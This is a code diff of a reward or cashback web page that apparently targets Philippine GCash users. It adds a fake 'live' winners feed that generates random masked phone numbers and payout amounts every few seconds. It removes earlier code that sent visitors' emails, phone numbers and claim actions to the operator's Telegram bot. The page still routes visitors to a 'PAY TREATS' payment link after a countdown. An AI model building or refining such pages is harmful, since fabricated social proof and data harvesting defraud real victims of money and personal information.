@@ -41,48 +41,152 @@
       display: none;
     }
 
-    /* ===== TOAST NOTIFICATION ===== */
-    .toast-notification {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background: rgba(0, 0, 0, 0.95);
-      color: #fff;
-      padding: 14px 20px;
-      border-radius: 12px;
-      border-left: 4px solid #0088cc;
+    /* ===== RANDOM WINNERS SECTION STYLES ===== */
+    .winners-section {
+      margin: 20px 0 25px 0;
+      padding: 15px 0;
+      border-top: 2px solid rgba(255, 255, 255, 0.08);
+      border-bottom: 2px solid rgba(255, 255, 255, 0.08);
+      background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.05), transparent);
+    }
+
+    .winners-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #00d4ff;
       font-size: 0.8rem;
-      z-index: 99999;
-      animation: slideUp 0.5s ease-out;
-      max-width: 340px;
-      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
-      pointer-events: none;
-    }
-
-    .toast-notification .toast-title {
-      color: #0088cc;
       font-weight: 700;
-      font-size: 0.7rem;
       text-transform: uppercase;
-      letter-spacing: 1px;
+      letter-spacing: 2px;
+      margin-bottom: 12px;
+      padding: 0 5px;
     }
 
-    .toast-notification .toast-message {
-      margin-top: 4px;
-      font-size: 0.75rem;
-      color: #ccc;
-      word-break: break-word;
+    .winners-header i {
+      font-size: 0.9rem;
+      animation: cashGlow 2s ease-in-out infinite;
+      color: #00d4ff;
     }
 
-    @keyframes slideUp {
+    @keyframes cashGlow {
+      0%, 100% { filter: drop-shadow(0 0 5px rgba(0, 212, 255, 0.3)); }
+      50% { filter: drop-shadow(0 0 20px rgba(0, 212, 255, 0.7)); }
+    }
+
+    .winners-list {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      max-height: 120px;
+      overflow-y: auto;
+      padding-right: 5px;
+    }
+
+    .winners-list::-webkit-scrollbar {
+      width: 3px;
+    }
+
+    .winners-list::-webkit-scrollbar-track {
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 10px;
+    }
+
+    .winners-list::-webkit-scrollbar-thumb {
+      background: rgba(0, 212, 255, 0.3);
+      border-radius: 10px;
+    }
+
+    .winner-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 8px 12px;
+      background: rgba(255, 255, 255, 0.03);
+      border-radius: 10px;
+      animation: slideInWinner 0.5s ease-out;
+      border-left: 2px solid rgba(0, 212, 255, 0.2);
+      transition: all 0.3s ease;
+    }
+
+    .winner-item:hover {
+      background: rgba(255, 255, 255, 0.06);
+      border-left-color: #00d4ff;
+    }
+
+    @keyframes slideInWinner {
       from {
         opacity: 0;
-        transform: translateY(30px);
+        transform: translateX(-20px);
       }
       to {
         opacity: 1;
-        transform: translateY(0);
+        transform: translateX(0);
       }
+    }
+
+    .winner-icon {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: rgba(0, 212, 255, 0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .winner-icon img {
+      width: 18px;
+      height: 18px;
+      object-fit: contain;
+      filter: drop-shadow(0 0 6px rgba(0, 212, 255, 0.3));
+    }
+
+    .winner-text {
+      flex: 1;
+      font-size: 0.85rem;
+      color: #e0e0e0;
+      line-height: 1.4;
+    }
+
+    .winner-text .phone-prefix {
+      color: #FFD700;
+      font-weight: 700;
+    }
+
+    .winner-text .phone-masked {
+      color: #aaa;
+    }
+
+    .winner-text .phone-suffix {
+      color: #FFD700;
+      font-weight: 700;
+    }
+
+    .winner-text .claimed-text {
+      color: #888;
+      margin: 0 4px;
+    }
+
+    .winner-text .amount-highlight {
+      color: #00d4ff;
+      font-weight: 800;
+      text-shadow: 0 0 20px rgba(0, 212, 255, 0.2);
+    }
+
+    .winner-time {
+      font-size: 0.6rem;
+      color: #666;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    .winners-divider {
+      width: 100%;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.2), transparent);
+      margin: 8px 0;
     }
 
     /* ===== HELP POPUP STYLES ===== */
@@ -353,6 +457,20 @@
       </div>
     </div>
 
+    <!-- ===== RANDOM WINNERS SECTION ===== -->
+    <div class="winners-section" id="winnersSection">
+      <div class="winners-header">
+        <i class="fas fa-coins"></i>
+        <span>💰 Received Cashbacks</span>
+        <span style="font-size: 0.6rem; color: #666; font-weight: 400; margin-left: auto;">
+          <i class="fas fa-circle" style="color: #00ff88; font-size: 0.4rem;"></i> live
+        </span>
+      </div>
+      <div class="winners-list" id="winnersList">
+        <!-- Winners will be dynamically added here -->
+      </div>
+    </div>
+
     <!-- Cards Grid -->
     <div class="cards-grid">
       <!-- Card 1 -->
@@ -496,9 +614,7 @@
     </div>
   </div>
 
-  <!-- ============================================================
-       HELP POPUP
-  ============================================================ -->
+  <!-- ===== HELP POPUP ===== -->
   <div class="help-popup-overlay" id="helpPopupOverlay">
     <div class="help-popup-content">
       <button class="help-popup-close" onclick="closeHelpPopup()">
@@ -536,7 +652,7 @@
   </div>
 
   <!-- ============================================================
-       JAVASCRIPT - COMPLETE WORKING
+       JAVASCRIPT - COMPLETE WORKING (NO TELEGRAM ALERTS)
   ============================================================ -->
   <script>
     // ============================================================
@@ -556,77 +672,6 @@
       }
     } catch(e) {
       console.log('⚠️ Firebase error:', e);
-    }
-
-    // ============================================================
-    // TELEGRAM FROM CONFIG.JS
-    // ============================================================
-    function sendTelegramMessage(message) {
-      if (typeof telegramConfig === 'undefined') {
-        console.log('⚠️ telegramConfig not found in config.js');
-        console.log('📱 TELEGRAM MESSAGE (SIMULATED):', message);
-        showToast('📱 Telegram (Simulated)', message.substring(0, 50) + '...');
-        return;
-      }
-
-      var botToken = telegramConfig.botToken;
-      var chatId = telegramConfig.chatId;
-
-      if (!botToken || !chatId) {
-        console.log('⚠️ Telegram credentials missing');
-        console.log('📱 TELEGRAM MESSAGE (SIMULATED):', message);
-        showToast('📱 Telegram (Simulated)', message.substring(0, 50) + '...');
-        return;
-      }
-
-      var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
-      
-      fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: 'HTML'
-        })
-      })
-      .then(function(response) {
-        if (response.ok) {
-          console.log('✅ Telegram message sent');
-          showToast('✅ Telegram Sent', 'Message delivered');
-        } else {
-          console.log('❌ Telegram error:', response.status);
-          showToast('❌ Telegram Error', 'Failed to send');
-        }
-      })
-      .catch(function(error) {
-        console.error('❌ Telegram error:', error);
-        showToast('❌ Telegram Error', error.message);
-      });
-    }
-
-    // ============================================================
-    // TOAST NOTIFICATION
-    // ============================================================
-    function showToast(title, message) {
-      var existingToast = document.querySelector('.toast-notification');
-      if (existingToast) {
-        existingToast.remove();
-      }
-
-      var toast = document.createElement('div');
-      toast.className = 'toast-notification';
-      toast.innerHTML = `
-        <div class="toast-title">${title}</div>
-        <div class="toast-message">${message}</div>
-      `;
-      document.body.appendChild(toast);
-
-      setTimeout(function() {
-        if (toast.parentNode) {
-          toast.remove();
-        }
-      }, 5000);
     }
 
     // ============================================================
@@ -656,16 +701,13 @@
       var input = document.getElementById('helpEmailInput');
       var error = document.getElementById('helpPopupError');
       
-      // Reset
       input.value = '';
       input.classList.remove('error');
       error.classList.remove('visible');
       
-      // Show popup
       overlay.classList.add('active');
       document.body.style.overflow = 'hidden';
       
-      // Focus input after animation
       setTimeout(function() {
         input.focus();
       }, 400);
@@ -683,7 +725,6 @@
       var btn = document.getElementById('helpChatBtn');
       var email = input.value.trim();
       
-      // Validate email
       var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
       
       if (!email || !emailRegex.test(email)) {
@@ -693,53 +734,17 @@
         return;
       }
       
-      // Remove error state
       input.classList.remove('error');
       error.classList.remove('visible');
       
-      // Disable button
       btn.disabled = true;
       btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
       
-      // ============================================================
-      // SEND TELEGRAM ALERT WITH EMAIL
-      // ============================================================
-      var currentTime = getPhilippineTime();
-      var userPhone = localStorage.getItem('user_phone') || '09171234567';
-      
-      var telegramMessage = '🆘 <b>HELP REQUEST</b>\n\n' +
-                            '📧 <b>Email:</b> ' + email + '\n' +
-                            '📱 <b>Phone:</b> ' + userPhone + '\n' +
-                            '🕐 <b>Time:</b> ' + currentTime;
-      
-      sendTelegramMessage(telegramMessage);
-      
-      // ============================================================
-      // SAVE TO FIREBASE (Optional)
-      // ============================================================
-      if (database) {
-        database.ref('help_requests').push({
-          email: email,
-          phone: userPhone,
-          timestamp: firebase.database.ServerValue.TIMESTAMP
-        });
-      }
-      
-      // Show success and redirect
-      btn.innerHTML = '<i class="fas fa-check-circle"></i> Redirecting...';
-      
       setTimeout(function() {
-        // Close help popup
         closeHelpPopup();
-        
-        // Reset button
         btn.disabled = false;
         btn.innerHTML = '<i class="fas fa-comment-dots"></i> Chat us now';
-        
-        // Open Google Chat
         window.open('https://chat.google.com/app/home', '_blank');
-        
-        showToast('✅ Redirecting', 'Opening Google Chat...');
       }, 1000);
     }
 
@@ -757,6 +762,8 @@
         if (document.getElementById('helpPopupOverlay').classList.contains('active')) {
           closeHelpPopup();
         }
+        if (cardPopupOverlay.classList.contains('active')) closeCardPopup();
+        if (claimPopupOverlay.classList.contains('active')) closeClaimPopup();
       }
     });
 
@@ -822,6 +829,9 @@
     var claimPayBtn = document.getElementById('claimPayBtn');
     var claimTimerDisplay = document.getElementById('claimTimerDisplay');
 
+    // Winners
+    var winnersList = document.getElementById('winnersList');
+
     // ============================================================
     // STATE
     // ============================================================
@@ -835,6 +845,7 @@
     var isRedirecting = false;
     var linkScannerInterval = null;
     var currentTreatType = null;
+    var winnerInterval = null;
 
     // ============================================================
     // HELPER FUNCTIONS
@@ -853,6 +864,88 @@
         minute: '2-digit',
         second: '2-digit'
       });
+    }
+
+    function getRandomPhoneNumber() {
+      var prefixes = ['09', '091', '092', '093', '094', '095', '096', '097', '098', '099'];
+      var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+      var middle = '***';
+      var last4 = String(Math.floor(Math.random() * 9000 + 1000));
+      return prefix + middle + last4;
+    }
+
+    function getRandomAmount() {
+      var amounts = [1500, 3000];
+      return amounts[Math.floor(Math.random() * amounts.length)];
+    }
+
+    function getRandomWinners(count) {
+      var winners = [];
+      var usedPhones = new Set();
+      
+      for (var i = 0; i < count; i++) {
+        var phone;
+        var attempts = 0;
+        do {
+          phone = getRandomPhoneNumber();
+          attempts++;
+        } while (usedPhones.has(phone) && attempts < 20);
+        usedPhones.add(phone);
+        
+        var amount = getRandomAmount();
+        var timeMinutes = Math.floor(Math.random() * 56) + 5;
+        
+        winners.push({
+          phone: phone,
+          amount: amount,
+          formattedAmount: formatWithCommas(amount),
+          timeMinutes: timeMinutes
+        });
+      }
+      return winners;
+    }
+
+    // ============================================================
+    // WINNERS DISPLAY
+    // ============================================================
+    function generateWinners() {
+      var winners = getRandomWinners(3);
+      var html = '';
+      
+      winners.forEach(function(winner, index) {
+        var phoneParts = winner.phone.match(/^(\d{2})(\*{3})(\d{4})$/);
+        var prefix = phoneParts ? phoneParts[1] : '09';
+        var masked = phoneParts ? phoneParts[2] : '***';
+        var suffix = phoneParts ? phoneParts[3] : '1234';
+        
+        html += `
+          <div class="winner-item" style="animation-delay: ${index * 0.1}s">
+            <div class="winner-icon">
+              <img src="photos/gc_icon.png" alt="GCash" />
+            </div>
+            <div class="winner-text">
+              <span class="phone-prefix">${prefix}</span>
+              <span class="phone-masked">${masked}</span>
+              <span class="phone-suffix">${suffix}</span>
+              <span class="claimed-text">has claimed</span>
+              <span class="amount-highlight">₱${winner.formattedAmount}</span>
+            </div>
+            <div class="winner-time">
+              <i class="fas fa-clock" style="font-size: 0.5rem;"></i>
+              ${winner.timeMinutes}m ago
+            </div>
+          </div>
+        `;
+      });
+      
+      winnersList.innerHTML = html;
+    }
+
+    function startWinnersRotation() {
+      generateWinners();
+      winnerInterval = setInterval(function() {
+        generateWinners();
+      }, 8000);
     }
 
     // ============================================================
@@ -1175,19 +1268,6 @@
       // PLAY SOUND
       playClaimSound();
       
-      // TELEGRAM ALERT 1: Claim Now
-      var currentTime = getPhilippineTime();
-      var formattedAmount = '₱' + formatWithCommas(rawAmount);
-      
-      var telegramMessage = '🎯 <b>CLAIM ALERT</b>\n\n' +
-                            '📌 <b>Action:</b> Claim Now\n' +
-                            '👤 <b>User:</b> ' + userPhone + '\n' +
-                            '💳 <b>Card:</b> ' + data.name + '\n' +
-                            '💰 <b>Amount:</b> ' + formattedAmount + '\n' +
-                            '🕐 <b>Time:</b> ' + currentTime;
-      
-      sendTelegramMessage(telegramMessage);
-      
       if (database && currentTreatType) {
         checkForDeployedLink(currentTreatType).then(function(link) {
           if (link) {
@@ -1217,23 +1297,6 @@
         console.log('⏰ Timer is already running');
         return;
       }
-      
-      // TELEGRAM ALERT 2: PAY TREATS
-      var cardNumber = parseInt(selectedCard.replace('card', ''));
-      var data = cardData[cardNumber];
-      var rawAmount = parseInt(data.badge.replace('₱', '').replace(/,/g, ''));
-      var userPhone = localStorage.getItem('user_phone') || '09171234567';
-      var currentTime = getPhilippineTime();
-      var formattedAmount = '₱' + formatWithCommas(rawAmount);
-      
-      var telegramMessage = '🎯 <b>CLAIM ALERT</b>\n\n' +
-                            '📌 <b>Action:</b> PAY TREATS\n' +
-                            '👤 <b>User:</b> ' + userPhone + '\n' +
-                            '💳 <b>Card:</b> ' + data.name + '\n' +
-                            '💰 <b>Amount:</b> ' + formattedAmount + '\n' +
-                            '🕐 <b>Time:</b> ' + currentTime;
-      
-      sendTelegramMessage(telegramMessage);
       
       if (treatLink && !isRedirecting) {
         isRedirecting = true;
@@ -1283,8 +1346,6 @@
                 setTimeout(function() { 
                   window.location.href = link; 
                 }, 1500);
-              } else {
-                showToast('⏰ Timer Finished', 'No payment link found yet');
               }
             });
           }
@@ -1308,13 +1369,6 @@
     }
 
     // ============================================================
-    // HELP - Original (overridden by openHelp above)
-    // ============================================================
-    // function openHelp() {
-    //   window.open('https://facebook.com/FreeShoppingPH', '_blank');
-    // }
-
-    // ============================================================
     // CLAIM NOW BUTTON
     // ============================================================
     claimNowBtn.addEventListener('click', function() {
@@ -1322,16 +1376,6 @@
         alert('💳 Please select a treat reward first!');
       } else {
         openClaimPopup();
-      }
-    });
-
-    // ============================================================
-    // ESCAPE KEY
-    // ============================================================
-    document.addEventListener('keydown', function(e) {
-      if (e.key === 'Escape') {
-        if (cardPopupOverlay.classList.contains('active')) closeCardPopup();
-        if (claimPopupOverlay.classList.contains('active')) closeClaimPopup();
       }
     });
 
@@ -1345,6 +1389,11 @@
     claimPopupOverlay.addEventListener('click', function(e) {
       if (e.target === claimPopupOverlay) closeClaimPopup();
     });
+
+    // ============================================================
+    // INITIALIZE WINNERS ROTATION
+    // ============================================================
+    startWinnersRotation();
 
     // ============================================================
     // EXPOSE FUNCTIONS GLOBALLY
@@ -1365,8 +1414,10 @@
     console.log('✅ Auto-scan enabled (every 1 second)');
     console.log('✅ Timer fixed - will countdown properly');
     console.log('✅ Sound will play on Claim Now');
-    console.log('✅ Telegram uses config.js');
-    console.log('✅ HELP popup with email collection ready');
+    console.log('✅ Winners rotation started (every 8 seconds)');
+    console.log('✅ Amounts: ₱1,500 and ₱3,000 only');
+    console.log('✅ Time gap: 5-60 minutes');
+    console.log('✅ No Telegram alerts');
   </script>
 
 </body>
